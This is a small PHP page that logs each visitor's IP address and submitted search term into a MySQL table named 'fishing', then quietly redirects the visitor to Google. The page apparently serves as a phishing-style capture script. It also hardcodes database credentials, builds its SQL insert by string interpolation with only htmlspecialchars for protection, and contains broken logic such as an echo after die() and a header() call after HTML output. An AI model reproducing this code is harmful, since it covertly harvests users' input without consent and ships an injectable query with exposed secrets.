<!DOCTYPE HTML>

<html>
<head>
    <title>Response</title>

    <?php
        /*$id = (int)($_GET["participantname"]);*/
        $id = $_SERVER['REMOTE_ADDR'];
        $change = htmlspecialchars($_GET["search"]);
        $server = "localhost";
        $username = "bluenix";
        $password = "1z3ass5z6p";
        $database = "register";
        $conn = mysqli_connect($server, $username, $password, $database);
 
        //Connection checker
        if (!$conn)
        {
            die("Connection failed: {mysqli_connect_error()}");
            echo "Connected successfully";
        }
        $sql = "insert into fishing (client_ip, search) values ('{$id}', '{$change}');";
        $result = mysqli_query($conn, $sql);


        $sql = "select * from  fishing ;";
        $result = mysqli_query($conn, $sql);

        header('Location: https://google.ca/'); 
    ?>
    
</head>

</html>